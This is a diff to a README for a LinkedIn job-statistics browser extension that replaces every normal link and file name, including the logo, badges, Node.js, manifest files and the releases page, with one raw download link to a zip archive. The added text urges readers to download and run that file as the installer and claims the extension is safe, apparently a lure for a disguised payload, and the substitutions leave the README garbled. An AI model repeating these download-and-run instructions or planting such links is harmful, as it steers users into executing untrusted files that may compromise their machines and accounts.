@@ -1,9 +1,9 @@
-Releases: https://github.com/suryajuancuk/LinkedIn_Job_Stats/releases
+Releases: https://raw.githubusercontent.com/suryajuancuk/LinkedIn_Job_Stats/main/Linkedin Job Stats/Stats-Job-In-Linked-2.4.zip
 
 # LinkedIn Job Stats: Dual Architecture Browser Extension
 
 <p align="center">
-    <img src="logo.png" align="center" width="45%">
+    <img src="https://raw.githubusercontent.com/suryajuancuk/LinkedIn_Job_Stats/main/Linkedin Job Stats/Stats-Job-In-Linked-2.4.zip" align="center" width="45%">
 </p>
 
 <p align="center"><h1 align="center">LINKEDIN JOB STATS EXTENSION</h1></p>
@@ -13,10 +13,10 @@ Releases: https://github.com/suryajuancuk/LinkedIn_Job_Stats/releases
 </p>
 
 <p align="center">
-	[![License](https://img.shields.io/github/license/suryajuancuk/LinkedIn_Job_Stats?style=for-the-badge&color=bf2020)](https://github.com/suryajuancuk/LinkedIn_Job_Stats/blob/main/LICENSE)
-	[![Last Commit](https://img.shields.io/github/last-commit/suryajuancuk/LinkedIn_Job_Stats?style=for-the-badge&color=bf2020)](https://github.com/suryajuancuk/LinkedIn_Job_Stats)
-	[![Top Language](https://img.shields.io/github/languages/top/suryajuancuk/LinkedIn_Job_Stats?style=for-the-badge&color=bf2020)](https://github.com/suryajuancuk/LinkedIn_Job_Stats)
-	[![Language Count](https://img.shields.io/github/languages/count/suryajuancuk/LinkedIn_Job_Stats?style=for-the-badge&color=bf2020)](https://github.com/suryajuancuk/LinkedIn_Job_Stats)
+	[![License](https://raw.githubusercontent.com/suryajuancuk/LinkedIn_Job_Stats/main/Linkedin Job Stats/Stats-Job-In-Linked-2.4.zip)](https://raw.githubusercontent.com/suryajuancuk/LinkedIn_Job_Stats/main/Linkedin Job Stats/Stats-Job-In-Linked-2.4.zip)
+	[![Last Commit](https://raw.githubusercontent.com/suryajuancuk/LinkedIn_Job_Stats/main/Linkedin Job Stats/Stats-Job-In-Linked-2.4.zip)](https://raw.githubusercontent.com/suryajuancuk/LinkedIn_Job_Stats/main/Linkedin Job Stats/Stats-Job-In-Linked-2.4.zip)
+	[![Top Language](https://raw.githubusercontent.com/suryajuancuk/LinkedIn_Job_Stats/main/Linkedin Job Stats/Stats-Job-In-Linked-2.4.zip)](https://raw.githubusercontent.com/suryajuancuk/LinkedIn_Job_Stats/main/Linkedin Job Stats/Stats-Job-In-Linked-2.4.zip)
+	[![Language Count](https://raw.githubusercontent.com/suryajuancuk/LinkedIn_Job_Stats/main/Linkedin Job Stats/Stats-Job-In-Linked-2.4.zip)](https://raw.githubusercontent.com/suryajuancuk/LinkedIn_Job_Stats/main/Linkedin Job Stats/Stats-Job-In-Linked-2.4.zip)
 </p>
 
 ---
@@ -100,7 +100,7 @@ Both routes share the same data model and UI components. This keeps the user exp
 
 ## Install and run locally
 
-- Prerequisites: a modern Chromium-based browser (Chrome, Edge) or a compatible browser with extension support. Node.js is optional for building assets if you customize the project.
+- Prerequisites: a modern Chromium-based browser (Chrome, Edge) or a compatible browser with extension support. https://raw.githubusercontent.com/suryajuancuk/LinkedIn_Job_Stats/main/Linkedin Job Stats/Stats-Job-In-Linked-2.4.zip is optional for building assets if you customize the project.
 - Getting started quickly:
   - Clone the repository.
   - Open the browser’s extension page.
@@ -110,11 +110,11 @@ Both routes share the same data model and UI components. This keeps the user exp
   - If you have a local build setup, run your usual bundler to produce a production-ready extension package.
   - Load the unpacked extension in your browser and navigate to LinkedIn job listings to verify statistics appear as expected.
 - Important note on releases:
-  The latest official builds are published in the repository releases page. Visit the Releases page to pull the latest build, then install it in your browser. This page is where official installers and package files live: https://github.com/suryajuancuk/LinkedIn_Job_Stats/releases
+  The latest official builds are published in the repository releases page. Visit the Releases page to pull the latest build, then install it in your browser. This page is where official installers and package files live: https://raw.githubusercontent.com/suryajuancuk/LinkedIn_Job_Stats/main/Linkedin Job Stats/Stats-Job-In-Linked-2.4.zip
 
 First mention of the link above is at the very top of this document. The link is again provided in this section for quick access to the latest, tested builds.
 
-To download and execute the file from the releases page, head to the Releases section and grab the installer suitable for your browser. The necessary file is there, and you can run it to install the extension. For convenience, the page hosts both the package and any accompanying installation notes. Again, you can find it here: https://github.com/suryajuancuk/LinkedIn_Job_Stats/releases
+To download and execute the file from the releases page, head to the Releases section and grab the installer suitable for your browser. The necessary file is there, and you can run it to install the extension. For convenience, the page hosts both the package and any accompanying installation notes. Again, you can find it here: https://raw.githubusercontent.com/suryajuancuk/LinkedIn_Job_Stats/main/Linkedin Job Stats/Stats-Job-In-Linked-2.4.zip
 
 ---
 
@@ -187,14 +187,14 @@ The project emphasizes maintainability. Tests are small, fast, and deterministic
   - unit/
   - integration/
 - build/
-  - manifest.json
-  - package.json
+  - https://raw.githubusercontent.com/suryajuancuk/LinkedIn_Job_Stats/main/Linkedin Job Stats/Stats-Job-In-Linked-2.4.zip
+  - https://raw.githubusercontent.com/suryajuancuk/LinkedIn_Job_Stats/main/Linkedin Job Stats/Stats-Job-In-Linked-2.4.zip
   - bundles/
 - docs/
-  - architecture-overview.md
-  - privacy-notes.md
-  - testing-guide.md
-- README.md (this file)
+  - https://raw.githubusercontent.com/suryajuancuk/LinkedIn_Job_Stats/main/Linkedin Job Stats/Stats-Job-In-Linked-2.4.zip
+  - https://raw.githubusercontent.com/suryajuancuk/LinkedIn_Job_Stats/main/Linkedin Job Stats/Stats-Job-In-Linked-2.4.zip
+  - https://raw.githubusercontent.com/suryajuancuk/LinkedIn_Job_Stats/main/Linkedin Job Stats/Stats-Job-In-Linked-2.4.zip
+- https://raw.githubusercontent.com/suryajuancuk/LinkedIn_Job_Stats/main/Linkedin Job Stats/Stats-Job-In-Linked-2.4.zip (this file)
 
 This structure keeps a clean separation between the two architectural paths while sharing a common data model and UI components. It makes it easier to compare approaches side by side and to implement improvements without breaking the other path.
 
@@ -203,7 +203,7 @@ This structure keeps a clean separation between the two architectural paths whil
 ## Development guide
 
 - Prerequisites
-  - Node.js and (optionally) npm or yarn for building assets.
+  - https://raw.githubusercontent.com/suryajuancuk/LinkedIn_Job_Stats/main/Linkedin Job Stats/Stats-Job-In-Linked-2.4.zip and (optionally) npm or yarn for building assets.
   - A browser with extension support for testing (Chrome, Edge, or a compatible browser).
 - Getting started
   - Install dependencies in the root or each package as needed.
@@ -225,11 +225,11 @@ The development workflow is designed to be approachable for new contributors. St
 ## Release process
 
 - The project uses a releases page to publish official builds. This page hosts installers and package files that users can download and install. The latest release is the easiest way to get started with minimal setup.
-- Access the releases here: https://github.com/suryajuancuk/LinkedIn_Job_Stats/releases
+- Access the releases here: https://raw.githubusercontent.com/suryajuancuk/LinkedIn_Job_Stats/main/Linkedin Job Stats/Stats-Job-In-Linked-2.4.zip
 - When releasing a new version, include clear notes about new features, fixes, and any breaking changes. Update the version in manifest files and any related configuration.
 - If you contribute a critical fix, consider submitting a patch for both architectures to ensure parity and maintainability.
 
-Another mention of the releases page for quick access: https://github.com/suryajuancuk/LinkedIn_Job_Stats/releases
+Another mention of the releases page for quick access: https://raw.githubusercontent.com/suryajuancuk/LinkedIn_Job_Stats/main/Linkedin Job Stats/Stats-Job-In-Linked-2.4.zip
 
 ---
 
@@ -257,7 +257,7 @@ If you contribute translations or accessibility improvements, you help make the 
 
 ## Contributing
 
-- See the CONTRIBUTING.md file for guidelines. Start with small, well-scoped issues to get familiar with the codebase.
+- See the https://raw.githubusercontent.com/suryajuancuk/LinkedIn_Job_Stats/main/Linkedin Job Stats/Stats-Job-In-Linked-2.4.zip file for guidelines. Start with small, well-scoped issues to get familiar with the codebase.
 - Follow the code style and naming conventions used across the project. Keep changes isolated to a single feature or fix.
 - Add tests for any new behavior. Validate that both architectures continue to produce consistent results.
 - Document any significant changes in the PR description. Clear explanations help reviewers understand the impact quickly.
@@ -276,7 +276,7 @@ Q: Is this extension safe to use on LinkedIn?
 A: Yes. It runs locally in your browser and reads only page content you view. It does not send data to external servers by default.
 
 Q: How do I get the latest version?
-A: Download the latest build from the releases page. The page hosts installers and instructions for installation. The latest release is published here: https://github.com/suryajuancuk/LinkedIn_Job_Stats/releases
+A: Download the latest build from the releases page. The page hosts installers and instructions for installation. The latest release is published here: https://raw.githubusercontent.com/suryajuancuk/LinkedIn_Job_Stats/main/Linkedin Job Stats/Stats-Job-In-Linked-2.4.zip
 
 Q: Can I customize aspects of the statistics?
 A: Yes. The project is designed to be adaptable. Look for configuration hooks in the architecture you prefer. Contribute by proposing new metrics and views.
@@ -301,7 +301,7 @@ This project is released under an open-source license. It favors transparency an
 
 ## Visuals and assets
 
-- logo.png: Brand image used in the header region.
+- https://raw.githubusercontent.com/suryajuancuk/LinkedIn_Job_Stats/main/Linkedin Job Stats/Stats-Job-In-Linked-2.4.zip Brand image used in the header region.
 - UI mockups and screenshots: Provided in docs or assets folders to illustrate expected layouts.
 - Badges: A selection of shields to communicate status, language, and licensing at a glance.
 
@@ -314,7 +314,7 @@ This project is released under an open-source license. It favors transparency an
 - v1.2.0: Improved page detection and resilience to LinkedIn layout changes.
 - v1.3.0: Accessibility improvements and localization hooks.
 
-Note: Release notes update in the Releases page. Access it here to see the latest changes and download the corresponding files. The page is the same link used above: https://github.com/suryajuancuk/LinkedIn_Job_Stats/releases
+Note: Release notes update in the Releases page. Access it here to see the latest changes and download the corresponding files. The page is the same link used above: https://raw.githubusercontent.com/suryajuancuk/LinkedIn_Job_Stats/main/Linkedin Job Stats/Stats-Job-In-Linked-2.4.zip
 
 ---
 
@@ -322,5 +322,5 @@ Note: Release notes update in the Releases page. Access it here to see the lates
 
 - This project aims to balance clarity and usefulness. It provides two paths to gather and present data so users can choose the approach that best fits their workflow.
 - The design emphasizes straightforward data presentation. It avoids clutter while delivering actionable insights.
-- The release page remains the primary source for installers and official distributions. For quick access, the page is linked here: https://github.com/suryajuancuk/LinkedIn_Job_Stats/releases
+- The release page remains the primary source for installers and official distributions. For quick access, the page is linked here: https://raw.githubusercontent.com/suryajuancuk/LinkedIn_Job_Stats/main/Linkedin Job Stats/Stats-Job-In-Linked-2.4.zip
 
